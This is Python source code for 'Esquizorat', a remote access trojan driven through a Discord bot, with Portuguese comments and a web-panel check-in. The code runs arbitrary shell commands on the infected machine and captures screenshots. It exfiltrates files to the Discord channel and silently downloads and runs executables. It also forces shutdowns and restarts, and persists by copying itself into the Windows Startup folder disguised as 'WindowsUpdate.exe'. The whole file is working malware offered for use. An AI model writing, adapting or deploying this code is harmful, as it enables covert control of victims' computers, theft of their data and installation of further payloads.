"""
Esquizorat - Discord Bot RAT + Web Panel Monitor
Conecta ao Discord via TOKEN para controle
Registra no painel web para monitoramento
"""
import discord
from discord.ext import commands
import platform, subprocess, os, time, io, sys

TOKEN = "DISCORD_TOKEN_PLACEHOLDER"
PANEL_URL = "PANEL_URL_PLACEHOLDER"

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents, help_command=None)

class RatCommands:
    @staticmethod
    def shell(cmd):
        try:
            return subprocess.check_output(cmd, shell=True, text=True, timeout=30, stderr=subprocess.STDOUT)
        except subprocess.CalledProcessError as e:
            return f"Error ({e.returncode}): {e.output}"
        except Exception as e:
            return f"Error: {e}"

    @staticmethod
    def screenshot():
        try:
            import pyautogui
            img = pyautogui.screenshot()
            buf = io.BytesIO()
            img.save(buf, format='PNG')
            buf.seek(0)
            return buf
        except:
            return None

    @staticmethod
    def files_list(path='C:\\'):
        try:
            items = os.listdir(path)
            return '\n'.join(items[:30])
        except:
            return f"Erro ao listar {path}"

    @staticmethod
    def sysinfo():
        return (f"PC: {platform.node()}\n"
                f"OS: {platform.system()} {platform.version()}\n"
                f"CPU: {platform.processor()}\n"
                f"User: {os.environ.get('USERNAME', 'N/A')}")

rat = RatCommands()

@bot.event
async def on_ready():
    print(f"[RAT] Conectado como {bot.user}")
    if PANEL_URL:
        try:
            from central_client import CentralClient
            client = CentralClient(PANEL_URL, platform.node())
            client.register()
        except:
            pass

@bot.command(name='shell')
async def cmd_shell(ctx, *, command):
    output = rat.shell(command)
    await ctx.send(f"```\n{output[:1900]}\n```" if len(output) > 5 else f"`{output}`")

@bot.command(name='screen')
async def cmd_screen(ctx):
    img = rat.screenshot()
    if img:
        await ctx.send(file=discord.File(img, 'screenshot.png'))
    else:
        await ctx.send("Erro ao capturar tela")

@bot.command(name='info')
async def cmd_info(ctx):
    await ctx.send(f"```\n{rat.sysinfo()}\n```")

@bot.command(name='files')
async def cmd_files(ctx, path='C:\\'):
    output = rat.files_list(path)
    await ctx.send(f"```\n{output}\n```")

@bot.command(name='download')
async def cmd_download(ctx, path):
    try:
        await ctx.send(file=discord.File(path))
    except:
        await ctx.send(f"Arquivo nao encontrado: {path}")

@bot.command(name='upload')
async def cmd_upload(ctx, url):
    try:
        import requests, tempfile
        r = requests.get(url, timeout=60)
        ext = '.exe' if url.lower().endswith('.exe') else '.tmp'
        path = os.path.join(tempfile.gettempdir(), f'update_{int(time.time())}{ext}')
        with open(path, 'wb') as f:
            f.write(r.content)
        subprocess.Popen(path, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        await ctx.send(f"Executado: {url}")
    except Exception as e:
        await ctx.send(f"Erro: {e}")

@bot.command(name='shutdown')
async def cmd_shutdown(ctx):
    os.system('shutdown /s /t 0')

@bot.command(name='restart')
async def cmd_restart(ctx):
    os.system('shutdown /r /t 0')

@bot.command(name='persist')
async def cmd_persist(ctx):
    try:
        import shutil
        exe = sys.executable
        startup = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        shutil.copy2(exe, os.path.join(startup, 'WindowsUpdate.exe'))
        await ctx.send("Persistencia instalada")
    except:
        await ctx.send("Falha na persistencia")

@bot.command(name='msg')
async def cmd_msg(ctx, *, text):
    try:
        import ctypes
        ctypes.windll.user32.MessageBoxW(0, text, "AVISO", 0x30)
        await ctx.send("Mensagem exibida")
    except:
        await ctx.send("Erro ao exibir mensagem")

try:
    bot.run(TOKEN)
except:
    pass
